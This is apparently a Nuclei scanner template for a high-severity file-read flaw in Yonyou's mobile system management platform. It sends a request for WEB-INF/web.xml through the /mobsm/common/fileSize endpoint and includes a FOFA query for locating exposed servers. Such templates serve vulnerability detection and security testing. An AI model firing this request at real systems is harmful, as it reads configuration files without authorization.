id: yonyou-mobile-fileSize-fileread

info:
  name: 用友移动系统管理平台 fileSize - fileread
  author: zhxknb1
  severity: high
  description:
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="用友-移动系统管理"
  tags: yonyou,mobile,lfi,oa

http:
  - method: GET
    path:
      - "{{BaseURL}}/mobsm/common/fileSize?path=WEB-INF/web.xml"

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"0") && contains_all(all_headers,"mobsm")'